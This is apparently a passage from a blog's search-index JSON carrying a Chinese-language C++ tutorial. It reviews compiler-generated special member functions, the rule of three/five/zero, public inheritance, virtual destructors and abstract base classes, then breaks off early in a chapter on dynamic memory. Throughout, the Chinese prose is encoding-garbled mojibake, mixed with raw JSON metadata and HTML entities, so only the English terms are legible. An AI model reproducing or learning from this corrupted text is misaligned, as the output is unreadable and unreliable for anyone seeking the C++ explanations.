ç±»è®¾è®¡çš„è®¸å¤šæ–¹é¢ï¼Œä»åŸºç¡€çš„å°è£…åˆ°å¤æ‚çš„ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜ç®¡ç†ã€‚æœ¬èŠ‚å°†å›é¡¾ä¸€äº›å…³é”®çš„è®¾è®¡å†³ç­–å’Œæœ€ä½³å®è·µã€‚ 13.8.1 ç¼–è¯‘å™¨ç”Ÿæˆçš„æˆå‘˜å‡½æ•°C++ ç¼–è¯‘å™¨å¯ä»¥ä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆä¸€äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œä½†è¿™å¹¶ä¸æ€»æ˜¯è¶³å¤Ÿçš„ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†èµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜ï¼‰æˆ–è®¾è®¡ç»§æ‰¿å±‚æ¬¡ç»“æ„æ—¶ã€‚ é»˜è®¤æ„é€ å‡½æ•° (Default Constructor): ç”Ÿæˆæ—¶æœº: å¦‚æœä½ æ²¡æœ‰å£°æ˜ä»»ä½•æ„é€ å‡½æ•°ã€‚ è¡Œä¸º: å¯¹æˆå‘˜æ‰§è¡Œé»˜è®¤åˆå§‹åŒ–ï¼ˆå†…ç½®ç±»å‹ä¸åˆå§‹åŒ–ï¼Œç±»ç±»å‹è°ƒç”¨å…¶é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚ æ³¨æ„: å¦‚æœä½ å®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ã€‚å¦‚æœæ­¤æ—¶ä½ è¿˜éœ€è¦ä¸€ä¸ªæ— å‚æ„é€ å‡½æ•°ï¼Œå¿…é¡»è‡ªå·±å®šä¹‰ã€‚ ææ„å‡½æ•° (Destructor): ç”Ÿæˆæ—¶æœº: å¦‚æœä½ æ²¡æœ‰å£°æ˜ææ„å‡½æ•°ã€‚ è¡Œä¸º: å¯¹ç±»ç±»å‹çš„æˆå‘˜è°ƒç”¨å®ƒä»¬çš„ææ„å‡½æ•°ã€‚ æ³¨æ„: å¦‚æœç±»ç®¡ç†éœ€è¦æ˜¾å¼é‡Šæ”¾çš„èµ„æºï¼ˆå¦‚ new åˆ†é…çš„å†…å­˜ï¼‰ï¼Œå¿…é¡»æä¾›è‡ªå®šä¹‰ææ„å‡½æ•°ã€‚å¦‚æœç±»æ‰“ç®—ä½œä¸ºåŸºç±»ï¼Œææ„å‡½æ•°åº”è¯¥æ˜¯ virtual çš„ã€‚ å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor): ç”Ÿæˆæ—¶æœº: å¦‚æœä½ æ²¡æœ‰å£°æ˜å¤åˆ¶æ„é€ å‡½æ•°ï¼ˆä¸”æ²¡æœ‰å£°æ˜ç§»åŠ¨æ“ä½œï¼‰ã€‚ è¡Œä¸º: æ‰§è¡Œ**æˆå‘˜é€ä¸€å¤åˆ¶ (æµ…å¤åˆ¶)**ã€‚å¯¹äºç±»ç±»å‹æˆå‘˜ï¼Œè°ƒç”¨å…¶å¤åˆ¶æ„é€ å‡½æ•°ã€‚ æ³¨æ„: å¦‚æœç±»ç®¡ç†åŠ¨æ€å†…å­˜æˆ–åŒ…å«ä¸èƒ½ç®€å•å¤åˆ¶çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶å¥æŸ„ï¼‰ï¼Œå¿…é¡»æä¾›è‡ªå®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°ä»¥å®ç°æ·±å¤åˆ¶ã€‚ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (Copy Assignment Operator): ç”Ÿæˆæ—¶æœº: å¦‚æœä½ æ²¡æœ‰å£°æ˜å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼ˆä¸”æ²¡æœ‰å£°æ˜ç§»åŠ¨æ“ä½œï¼‰ã€‚ è¡Œä¸º: æ‰§è¡Œ**æˆå‘˜é€ä¸€èµ‹å€¼ (æµ…å¤åˆ¶)**ã€‚å¯¹äºç±»ç±»å‹æˆå‘˜ï¼Œè°ƒç”¨å…¶å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ã€‚ æ³¨æ„: å¦‚æœç±»ç®¡ç†åŠ¨æ€å†…å­˜æˆ–éœ€è¦ç‰¹æ®Šèµ‹å€¼é€»è¾‘ï¼Œå¿…é¡»æä¾›è‡ªå®šä¹‰å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¡®ä¿æ·±å¤åˆ¶ã€å¤„ç†è‡ªæˆ‘èµ‹å€¼å¹¶é‡Šæ”¾æ—§èµ„æºã€‚ ç§»åŠ¨æ„é€ å‡½æ•° (Move Constructor) (C++11): ç”Ÿæˆæ—¶æœº: å¦‚æœä½ æ²¡æœ‰å£°æ˜ä»»ä½•å¤åˆ¶æ“ä½œï¼ˆå¤åˆ¶æ„é€ ã€å¤åˆ¶èµ‹å€¼ï¼‰ã€ç§»åŠ¨æ“ä½œï¼ˆç§»åŠ¨æ„é€ ã€ç§»åŠ¨èµ‹å€¼ï¼‰æˆ–ææ„å‡½æ•°ã€‚ è¡Œä¸º: æ‰§è¡Œæˆå‘˜é€ä¸€ç§»åŠ¨ã€‚å¯¹äºç±»ç±»å‹æˆå‘˜ï¼Œè°ƒç”¨å…¶ç§»åŠ¨æ„é€ å‡½æ•°ã€‚ç›®çš„æ˜¯é«˜æ•ˆåœ°è½¬ç§»èµ„æºæ‰€æœ‰æƒï¼Œè€Œä¸æ˜¯å¤åˆ¶ã€‚ æ³¨æ„: å¦‚æœéœ€è¦è‡ªå®šä¹‰èµ„æºè½¬ç§»é€»è¾‘ï¼Œæˆ–è€…é»˜è®¤çš„æˆå‘˜ç§»åŠ¨ä¸åˆé€‚ï¼Œå¯ä»¥è‡ªå®šä¹‰ã€‚å¦‚æœå®šä¹‰äº†ä»»ä½•å¤åˆ¶æ“ä½œæˆ–ææ„å‡½æ•°ï¼Œé»˜è®¤çš„ç§»åŠ¨æ„é€ å‡½æ•°é€šå¸¸ä¸ä¼šç”Ÿæˆï¼Œéœ€è¦æ—¶éœ€æ˜¾å¼ = default æˆ–è‡ªå®šä¹‰ã€‚ ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (Move Assignment Operator) (C++11): ç”Ÿæˆæ—¶æœº: ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ã€‚ è¡Œä¸º: æ‰§è¡Œæˆå‘˜é€ä¸€ç§»åŠ¨èµ‹å€¼ã€‚ æ³¨æ„: ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰æˆ–é»˜è®¤ç‰ˆæœ¬æœªç”Ÿæˆï¼Œéœ€æ˜¾å¼å¤„ç†ã€‚ ä¸‰/äº”/é›¶æ³•åˆ™ (Rule of Three/Five/Zero): ä¸‰æ³•åˆ™ (C++11 å‰): å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œä½ å‡ ä¹è‚¯å®šéœ€è¦å…¨éƒ¨ä¸‰ä¸ªã€‚ äº”æ³•åˆ™ (C++11): å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ä¸Šè¿°ä¸‰ä¸ªæˆ–ç§»åŠ¨æ„é€ å‡½æ•°/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯èƒ½éœ€è¦è€ƒè™‘å…¨éƒ¨äº”ä¸ªã€‚ é›¶æ³•åˆ™ (æ¨è): ä¼˜å…ˆä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™ï¼Œåˆ©ç”¨æ ‡å‡†åº“å®¹å™¨ï¼ˆstd::string, std::vectorï¼‰å’Œæ™ºèƒ½æŒ‡é’ˆï¼ˆstd::unique_ptr, std::shared_ptrï¼‰æ¥ç®¡ç†èµ„æºã€‚å¦‚æœç±»åªåŒ…å«è¿™äº›èƒ½è‡ªæˆ‘ç®¡ç†çš„æˆå‘˜ï¼Œé€šå¸¸ä¸éœ€è¦è‡ªå®šä¹‰ä»»ä½•ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬å°±èƒ½å¾ˆå¥½åœ°å·¥ä½œã€‚ 13.8.2 å…¶ä»–çš„ç±»æ–¹æ³•é™¤äº†ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œç±»è¿˜åŒ…å«å…¶ä»–ç”¨äºå®ç°å…¶åŠŸèƒ½çš„æ–¹æ³•ï¼š æ„é€ å‡½æ•° (Constructors): é™¤äº†é»˜è®¤æ„é€ å‡½æ•°ï¼Œè¿˜å¯ä»¥å®šä¹‰å¤šä¸ªæ„é€ å‡½æ•°æ¥æä¾›ä¸åŒçš„å¯¹è±¡åˆå§‹åŒ–æ–¹å¼ï¼ˆä¾‹å¦‚ï¼Œæ¥å—ä¸åŒå‚æ•°ï¼‰ã€‚ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ–æˆå‘˜å˜é‡ã€‚è€ƒè™‘ä½¿ç”¨ explicit å…³é”®å­—é˜»æ­¢ä¸æœŸæœ›çš„å•å‚æ•°éšå¼è½¬æ¢ã€‚ è®¿é—®å™¨ (Accessors): é€šå¸¸æ˜¯ public const æˆå‘˜å‡½æ•°ï¼Œç”¨äºè·å–å¯¹è±¡çš„çŠ¶æ€ï¼ˆç§æœ‰æ•°æ®æˆå‘˜çš„å€¼ï¼‰ï¼Œä½†ä¸ä¿®æ”¹å¯¹è±¡ã€‚ä¾‹å¦‚ Balance() constã€‚ ä¿®æ”¹å™¨ (Mutators) / è®¾ç½®å™¨ (Setters): ç”¨äºä¿®æ”¹å¯¹è±¡çŠ¶æ€ï¼ˆç§æœ‰æ•°æ®æˆå‘˜çš„å€¼ï¼‰çš„ public æˆå‘˜å‡½æ•°ã€‚ä¾‹å¦‚ ResetTable(bool v)ã€‚ åŠŸèƒ½å‡½æ•° (Utility Functions): å®ç°ç±»æ ¸å¿ƒé€»è¾‘çš„å…¶ä»–æˆå‘˜å‡½æ•°ã€‚å¯ä»¥æ˜¯ public, protected, æˆ– privateã€‚ const æˆå‘˜å‡½æ•°: åœ¨å‡½æ•°å£°æ˜å’Œå®šä¹‰ååŠ  constï¼Œè¡¨ç¤ºè¯¥å‡½æ•°ä¸ä¼šä¿®æ”¹è°ƒç”¨å®ƒçš„å¯¹è±¡çš„çŠ¶æ€ï¼ˆæ•°æ®æˆå‘˜ï¼‰ã€‚const å¯¹è±¡åªèƒ½è°ƒç”¨ const æˆå‘˜å‡½æ•°ã€‚ é™æ€æˆå‘˜å‡½æ•° (static): ä¸ç±»æœ¬èº«å…³è”ï¼Œè€Œä¸æ˜¯ç‰¹å®šå¯¹è±¡ã€‚æ²¡æœ‰ this æŒ‡é’ˆï¼Œåªèƒ½è®¿é—®é™æ€æˆå‘˜ã€‚é€šè¿‡ç±»åè°ƒç”¨ (ClassName::staticFunc())ã€‚ è™šå‡½æ•° (virtual): ç”¨äºåœ¨ç»§æ‰¿å±‚æ¬¡ç»“æ„ä¸­å®ç°å¤šæ€ã€‚å…è®¸é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨æ´¾ç”Ÿç±»çš„ç‰¹å®šå®ç°ã€‚ 13.8.3 å…¬æœ‰ç»§æ‰¿çš„è€ƒè™‘å› ç´ å…¬æœ‰ç»§æ‰¿æ˜¯å®ç° â€œis-aâ€ å…³ç³»å’Œå¤šæ€çš„å…³é”®ï¼Œä½†éœ€è¦ä»”ç»†è€ƒè™‘ï¼š â€œis-aâ€ å…³ç³»: ç¡®ä¿æ´¾ç”Ÿç±»ç¡®å®æ˜¯åŸºç±»çš„ä¸€ç§ç‰¹æ®Šç±»å‹ï¼Œå¹¶ä¸”ç¬¦åˆåŸºç±»çš„è¡Œä¸ºå¥‘çº¦ï¼ˆLiskov æ›¿æ¢åŸåˆ™ï¼‰ã€‚ è™šææ„å‡½æ•°: å¦‚æœç±»å¯èƒ½è¢«ç”¨ä½œåŸºç±»ï¼ˆç‰¹åˆ«æ˜¯å¦‚æœå¯èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆ delete æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œå¿…é¡»å°†ææ„å‡½æ•°å£°æ˜ä¸º virtualã€‚ ç»§æ‰¿æ¥å£ vs. å®ç°: çº¯è™šå‡½æ•°: åªç»§æ‰¿æ¥å£ï¼Œå¼ºåˆ¶æ´¾ç”Ÿç±»æä¾›å®ç°ï¼ˆç”¨äºæŠ½è±¡åŸºç±»ï¼‰ã€‚ è™šå‡½æ•° (æœ‰å®ç°): ç»§æ‰¿æ¥å£å’Œé»˜è®¤å®ç°ï¼Œå…è®¸æ´¾ç”Ÿç±»è¦†ç›–é»˜è®¤å®ç°ã€‚ éè™šå‡½æ•°: ç»§æ‰¿æ¥å£å’Œå¼ºåˆ¶å®ç°ï¼Œæ´¾ç”Ÿç±»ä¸åº”é‡æ–°å®šä¹‰ï¼ˆè¦†ç›–éè™šå‡½æ•°é€šå¸¸æ˜¯åæ‰“ç®—ï¼‰ã€‚ è®¿é—®æ§åˆ¶: public æˆå‘˜æ„æˆç±»çš„å…¬æœ‰æ¥å£ã€‚ private æˆå‘˜æ˜¯å®ç°ç»†èŠ‚ï¼Œå¯¹æ´¾ç”Ÿç±»éšè—ã€‚ protected æˆå‘˜å¯¹æ´¾ç”Ÿç±»å¯è§ï¼Œä½†å¯¹å¤–éƒ¨éšè—ã€‚è°¨æ…ä½¿ç”¨ protected æ•°æ®ï¼Œå®ƒä¼šå¢åŠ åŸºç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´çš„è€¦åˆã€‚ä¼˜å…ˆä½¿ç”¨ protected å‡½æ•°ã€‚ æ„é€ å‡½æ•°å’Œåˆå§‹åŒ–: æ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼ˆé€šå¸¸åœ¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼‰æ¥åˆå§‹åŒ–åŸºç±»éƒ¨åˆ†ã€‚ èµ‹å€¼è¿ç®—ç¬¦: æ´¾ç”Ÿç±»çš„èµ‹å€¼è¿ç®—ç¬¦éœ€è¦æ˜¾å¼è°ƒç”¨åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç†åŸºç±»éƒ¨åˆ†ã€‚ å¯¹è±¡åˆ‡ç‰‡ (Slicing): å¦‚æœå°†æ´¾ç”Ÿç±»å¯¹è±¡ç›´æ¥æŒ‰å€¼èµ‹ç»™åŸºç±»å¯¹è±¡ï¼ˆBase b = derived;ï¼‰ï¼Œæ´¾ç”Ÿç±»ç‰¹æœ‰çš„éƒ¨åˆ†ä¼šè¢«â€œåˆ‡æ‰â€ï¼Œåªä¿ç•™åŸºç±»éƒ¨åˆ†ã€‚è¿™æ˜¯éœ€è¦é¿å…çš„ï¼Œé€šå¸¸åº”ä½¿ç”¨æŒ‡é’ˆæˆ–å¼•ç”¨æ¥å¤„ç†å¤šæ€å¯¹è±¡ã€‚ 13.8.4 ç±»å‡½æ•°å°ç»“ å‡½æ•°ç±»åˆ« ç›®çš„ä¸è¯´æ˜ å…³é”®ç‰¹æ€§/å…³é”®å­— æ„é€ å‡½æ•° åˆå§‹åŒ–æ–°åˆ›å»ºçš„å¯¹è±¡ ç±»åç›¸åŒ, æ— è¿”å›ç±»å‹, å¯é‡è½½, explicit ææ„å‡½æ•° å¯¹è±¡é”€æ¯å‰æ‰§è¡Œæ¸…ç†å·¥ä½œï¼ˆé‡Šæ”¾èµ„æºï¼‰ ~ClassName(), æ— å‚æ•°, æ— è¿”å›ç±»å‹, virtual å¤åˆ¶æ„é€ å‡½æ•° ç”¨åŒç±»å¯¹è±¡åˆå§‹åŒ–æ–°å¯¹è±¡ ClassName(const ClassName &amp;), æ·±å¤åˆ¶ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ å°†ä¸€ä¸ªå·²å­˜åœ¨çš„åŒç±»å¯¹è±¡èµ‹ç»™å¦ä¸€ä¸ª operator=(const ClassName &amp;), æ·±å¤åˆ¶, è¿”å› *this ç§»åŠ¨æ„é€ å‡½æ•° ç”¨åŒç±»å³å€¼å¯¹è±¡åˆå§‹åŒ–æ–°å¯¹è±¡ï¼ˆè½¬ç§»èµ„æºï¼‰ ClassName(ClassName &amp;&amp;), C++11, ç§»åŠ¨è¯­ä¹‰ ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ å°†ä¸€ä¸ªåŒç±»å³å€¼å¯¹è±¡èµ‹ç»™å¦ä¸€ä¸ªï¼ˆè½¬ç§»èµ„æºï¼‰ operator=(ClassName &amp;&amp;), C++11, ç§»åŠ¨è¯­ä¹‰ æ™®é€šæˆå‘˜å‡½æ•° å®ç°ç±»çš„è¡Œä¸ºå’ŒåŠŸèƒ½ éšå¼ this æŒ‡é’ˆ const æˆå‘˜å‡½æ•° è®¿é—®å¯¹è±¡çŠ¶æ€ï¼Œä½†ä¸ä¿®æ”¹å¯¹è±¡ å‡½æ•°å£°æ˜/å®šä¹‰ååŠ  const static æˆå‘˜å‡½æ•° ä¸ç±»æœ¬èº«å…³è”ï¼Œè€Œéç‰¹å®šå¯¹è±¡ static, æ—  this æŒ‡é’ˆ virtual å‡½æ•° å…è®¸åœ¨æ´¾ç”Ÿç±»ä¸­è¦†ç›–ï¼Œå®ç°å¤šæ€ virtual, åŠ¨æ€è”ç¼– çº¯è™šå‡½æ•° å®šä¹‰æ¥å£ï¼Œå¼ºåˆ¶æ´¾ç”Ÿç±»å®ç°ï¼ˆç”¨äº ABCï¼‰ virtual ... = 0; è¿ç®—ç¬¦é‡è½½å‡½æ•° å®šä¹‰æ ‡å‡†è¿ç®—ç¬¦ç”¨äºç±»å¯¹è±¡çš„è¡Œä¸º operator+, operator&lt;&lt;, etc. è½¬æ¢å‡½æ•° å®šä¹‰ä»ç±»ç±»å‹åˆ°å…¶ä»–ç±»å‹çš„è½¬æ¢ operator typeName(), explicit å‹å…ƒå‡½æ•°/ç±» å…è®¸éæˆå‘˜å‡½æ•°æˆ–ç±»è®¿é—®ç§æœ‰/ä¿æŠ¤æˆå‘˜ friend è®¾è®¡è‰¯å¥½çš„ç±»éœ€è¦ä»”ç»†è€ƒè™‘è¿™äº›ä¸åŒç±»å‹çš„å‡½æ•°ï¼Œç¡®ä¿å°è£…æ€§ã€èµ„æºç®¡ç†çš„æ­£ç¡®æ€§ã€æ¥å£çš„æ¸…æ™°æ€§ä»¥åŠåœ¨ç»§æ‰¿ä½“ç³»ä¸­çš„æ°å½“è¡Œä¸ºã€‚ 13.9 æ€»ç»“æœ¬ç« ä»‹ç»äº† C++ çš„ä¸€ä¸ªæ ¸å¿ƒç‰¹æ€§â€”â€”ç»§æ‰¿ï¼Œå®ƒå…è®¸æˆ‘ä»¬åŸºäºç°æœ‰ç±»åˆ›å»ºæ–°ç±»ï¼Œå®ç°ä»£ç é‡ç”¨å’Œå»ºç«‹ç±»ä¹‹é—´çš„å±‚æ¬¡å…³ç³»ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š åŸºæœ¬ç»§æ‰¿: ä¸€ä¸ªç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰å¯ä»¥ä»å¦ä¸€ä¸ªç±»ï¼ˆåŸºç±»ï¼‰ç»§æ‰¿æˆå‘˜ï¼ˆæ•°æ®å’Œæ–¹æ³•ï¼‰ã€‚ å…¬æœ‰ç»§æ‰¿ (public) æ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ï¼Œå»ºç«‹ â€œis-aâ€ å…³ç³»ï¼Œæ„å‘³ç€æ´¾ç”Ÿç±»å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªåŸºç±»å¯¹è±¡ã€‚åŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯å…¬æœ‰ï¼Œä¿æŠ¤æˆå‘˜ä»ç„¶æ˜¯ä¿æŠ¤ã€‚ æ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»é€šè¿‡æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ç»§æ‰¿çš„åŸºç±»éƒ¨åˆ†ã€‚ å¤šæ€å…¬æœ‰ç»§æ‰¿: å¤šæ€å…è®¸æˆ‘ä»¬é€šè¿‡åŸºç±»æ¥å£ï¼ˆæŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ç»Ÿä¸€å¤„ç†ä¸åŒç±»å‹çš„æ´¾ç”Ÿç±»å¯¹è±¡ã€‚ é€šè¿‡åœ¨åŸºç±»ä¸­å°†æˆå‘˜å‡½æ•°å£°æ˜ä¸ºè™šå‡½æ•° (virtual) æ¥å¯ç”¨å¤šæ€è¡Œä¸ºã€‚ å½“é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹é€‰æ‹©è°ƒç”¨å“ªä¸ªç‰ˆæœ¬çš„æ–¹æ³•ï¼ˆåŠ¨æ€è”ç¼–æˆ–æ™šç»‘å®šï¼‰ã€‚ å¦‚æœå‡½æ•°ä¸æ˜¯è™šå‡½æ•°ï¼Œæˆ–è€…é€šè¿‡å¯¹è±¡ç›´æ¥è°ƒç”¨ï¼Œåˆ™åœ¨ç¼–è¯‘æ—¶æ ¹æ®æŒ‡é’ˆ/å¼•ç”¨çš„å£°æ˜ç±»å‹æˆ–å¯¹è±¡ç±»å‹å†³å®šè°ƒç”¨ç‰ˆæœ¬ï¼ˆé™æ€è”ç¼–æˆ–æ—©ç»‘å®šï¼‰ã€‚ è™šå‡½æ•°æ³¨æ„äº‹é¡¹: override (C++11): æ¨èåœ¨æ´¾ç”Ÿç±»è¦†ç›–è™šå‡½æ•°æ—¶ä½¿ç”¨ï¼Œä»¥è¿›è¡Œç¼–è¯‘å™¨æ£€æŸ¥ã€‚ final (C++11): å¯ç”¨äºé˜»æ­¢è™šå‡½æ•°åœ¨æ›´æ·±å±‚æ´¾ç”Ÿç±»ä¸­è¢«è¦†ç›–ï¼Œæˆ–é˜»æ­¢ç±»è¢«ç»§æ‰¿ã€‚ æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°ã€‚ è™šææ„å‡½æ•°: å¦‚æœç±»å¯èƒ½è¢«ç”¨ä½œåŸºç±»ï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠåŠ¨æ€å†…å­˜åˆ†é…æˆ–å¯èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆåˆ é™¤æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œå…¶ææ„å‡½æ•°å¿…é¡»å£°æ˜ä¸º virtualï¼Œä»¥ç¡®ä¿æ­£ç¡®çš„ææ„é¡ºåºå’Œèµ„æºé‡Šæ”¾ã€‚ è®¿é—®æ§åˆ¶ (protected): protected æˆå‘˜å¯¹ç±»å†…éƒ¨å’Œæ´¾ç”Ÿç±»æˆå‘˜å‡½æ•°å¯è§ï¼Œä½†å¯¹å¤–éƒ¨ä»£ç ä¸å¯è§ã€‚ å®ƒæä¾›äº†ä»‹äº private å’Œ public ä¹‹é—´çš„è®¿é—®çº§åˆ«ã€‚ è™½ç„¶ protected å…è®¸æ´¾ç”Ÿç±»ç›´æ¥è®¿é—®åŸºç±»å®ç°ç»†èŠ‚ï¼Œä½†å¯èƒ½ç ´åå°è£…ï¼Œåº”è°¨æ…ä½¿ç”¨ã€‚ä¼˜å…ˆä½¿ç”¨ private æ•°æ®å’Œ public/protected æ¥å£å‡½æ•°ã€‚ æŠ½è±¡åŸºç±» (ABC): åŒ…å«è‡³å°‘ä¸€ä¸ªçº¯è™šå‡½æ•° (virtual ... = 0;) çš„ç±»æ˜¯æŠ½è±¡åŸºç±»ã€‚ ABC ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼ˆä¸èƒ½åˆ›å»ºå¯¹è±¡ï¼‰ã€‚ ä¸»è¦ç”¨äºå®šä¹‰ä¸€ä¸ªæ¥å£è§„èŒƒï¼Œå¼ºåˆ¶æ´¾ç”Ÿç±»å®ç°çº¯è™šå‡½æ•°ã€‚ å¯ä»¥å£°æ˜æŒ‡å‘ ABC çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œç”¨äºå®ç°å¤šæ€ã€‚ æ´¾ç”Ÿç±»åªæœ‰å®ç°äº†æ‰€æœ‰ç»§æ‰¿çš„çº¯è™šå‡½æ•°åï¼Œæ‰èƒ½æˆä¸ºå…·ä½“ç±»ã€‚ ç»§æ‰¿ä¸åŠ¨æ€å†…å­˜åˆ†é…: åŸºç±»ä½¿ç”¨ newï¼Œæ´¾ç”Ÿç±»ä¸ç”¨: æ´¾ç”Ÿç±»é€šå¸¸ä¸éœ€è¦è‡ªå®šä¹‰ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œä½†åŸºç±»å¿…é¡»æœ‰è™šææ„å‡½æ•°ã€‚ åŸºç±»å’Œæ´¾ç”Ÿç±»éƒ½ä½¿ç”¨ new: æ´¾ç”Ÿç±»å¿…é¡»æä¾›è‡ªå·±çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ã€‚æ´¾ç”Ÿç±»çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦å¿…é¡»æ˜¾å¼è°ƒç”¨åŸºç±»çš„å¯¹åº”ç‰ˆæœ¬æ¥å¤„ç†åŸºç±»éƒ¨åˆ†ã€‚åŸºç±»ææ„å‡½æ•°ä»éœ€æ˜¯è™šå‡½æ•°ã€‚ ç±»è®¾è®¡å›é¡¾: ç†è§£ç¼–è¯‘å™¨ç”Ÿæˆçš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆæ„é€ ã€ææ„ã€å¤åˆ¶ã€ç§»åŠ¨ï¼‰åŠå…¶å±€é™æ€§ã€‚ éµå¾ªä¸‰/äº”/é›¶æ³•åˆ™æ¥ç®¡ç†èµ„æºï¼Œä¼˜å…ˆä½¿ç”¨ RAIIï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆã€æ ‡å‡†å®¹å™¨ï¼‰ã€‚ åˆç†ä½¿ç”¨ const æˆå‘˜å‡½æ•°ã€‚ è°¨æ…è®¾è®¡ç»§æ‰¿å…³ç³»ï¼Œç¡®ä¿ç¬¦åˆ â€œis-aâ€ åŸåˆ™ã€‚ æ­£ç¡®ä½¿ç”¨è™šå‡½æ•°å’Œè™šææ„å‡½æ•°å®ç°å¤šæ€å’Œå®‰å…¨çš„èµ„æºç®¡ç†ã€‚ ç»§æ‰¿æ˜¯ C++ ä¸­å®ç°ä»£ç é‡ç”¨ã€å»ºç«‹ç±»å‹å±‚æ¬¡ç»“æ„å’Œå®ç°å¤šæ€çš„å…³é”®æœºåˆ¶ã€‚ç†è§£å…¶å·¥ä½œåŸç†ã€ä¸åŒç±»å‹çš„ç»§æ‰¿ï¼ˆæœ¬ç« ä¸»è¦å…³æ³¨å…¬æœ‰ç»§æ‰¿ï¼‰ä»¥åŠç›¸å…³çš„è®¾è®¡åŸåˆ™å¯¹äºç¼–å†™å¼ºå¤§çš„ã€å¯ç»´æŠ¤çš„é¢å‘å¯¹è±¡ç¨‹åºè‡³å…³é‡è¦ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 12 ç±»å’ŒåŠ¨æ€å†…å­˜åˆ†é…","slug":"Cpp_tutorial_Chapter_12","date":"2025-04-30T15:42:24.005Z","updated":"2025-04-30T15:39:55.641Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_12/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_12/","excerpt":"","text":"12.1 åŠ¨æ€å†…å­˜å’Œç±»å½“ç±»éœ€è¦ä½¿ç”¨ new åœ¨è‡ªç”±å­˜å‚¨åŒºï¼ˆå †ï¼‰ä¸Šåˆ†é…å†…å­˜æ—¶ï¼Œæƒ…å†µä¼šå˜å¾—æ¯”ä¹‹å‰æˆ‘ä»¬çœ‹åˆ°çš„ç±»ï¼ˆå¦‚ Stock, Time, Vectorï¼‰æ›´å¤æ‚ã€‚è¿™äº›ç±»çš„æ•°æ®æˆå‘˜æœ¬èº«ï¼ˆå¦‚ int, double, std::stringï¼‰è¦ä¹ˆå¤§å°å›ºå®šï¼Œè¦ä¹ˆåƒ std::string é‚£æ ·è‡ªå·±ç®¡ç†å†…å­˜ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½ 